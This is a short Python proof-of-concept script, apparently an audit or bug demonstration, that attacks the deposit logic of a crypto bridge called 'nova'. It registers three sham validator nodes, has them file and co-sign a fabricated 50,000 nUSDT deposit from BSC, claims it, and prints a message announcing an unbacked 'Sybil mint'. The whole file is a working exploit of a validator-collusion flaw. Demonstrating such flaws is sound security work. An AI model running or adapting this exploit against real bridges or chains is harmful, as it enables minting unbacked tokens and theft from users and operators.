import sys, time, json
sys.path.insert(0, ".")
from core.storage import StateStore
from core.economy import Economy
from core.bridge import Bridge

store = StateStore("genesis.json")
eco = Economy(store)
b = Bridge(store, eco)

nodes = ["0x" + "a"*40, "0x" + "b"*40, "0x" + "c"*40]
for n in nodes:
    store.balances[n] = 2000.0
    store.bridge_nodes[n] = {"addr": n, "stake": 1000.0, "status": "active", "registered_at": time.time(), "signed": 0}

class FakeTx:
    _seq = 0
    def __init__(self, sender, data_dict, amount=0):
        FakeTx._seq += 1
        self.sender = sender; self.receiver = sender; self.amount = amount
        self.data = json.dumps(data_dict)
        self.txid = f"tx{FakeTx._seq:08d}"

def tx(sender, data_dict, amount=0):
    return FakeTx(sender, data_dict, amount)

d = {"op": "nova:bridge:deposit", "asset": "nUSDT", "source_chain": "bsc",
     "source_tx": "11"*32, "source_addr": "0x" + "e"*40, "amount": 50000.0}
assert b.validate_op(tx(nodes[0], d)), "deposit validate"
b.apply_op(tx(nodes[0], d))
dep = list(store.bridge_deposits.values())[0]
did = dep["deposit_id"]
print("deposit:", dep["status"], "sigs:", len(dep["sigs"]))

for n in nodes[1:]:
    b.apply_op(tx(n, {"op": "nova:bridge:deposit:sign", "deposit_id": did}))
dep = store.bridge_deposits[did]
print("after 3 sigs:", dep["status"], "sigs:", len(dep["sigs"]))

user = "0x" + "f"*40
b.apply_op(tx(nodes[0], {"op": "nova:bridge:deposit:claim", "deposit_id": did}))
asset = store.bridge_assets["nUSDT"]
print("minted nUSDT supply:", asset["supply"], "user balance:", asset["balances"].get(user, 0))
print("SYBIL MINT OK: attacker-created 50,000 nUSDT with no real BSC deposit")
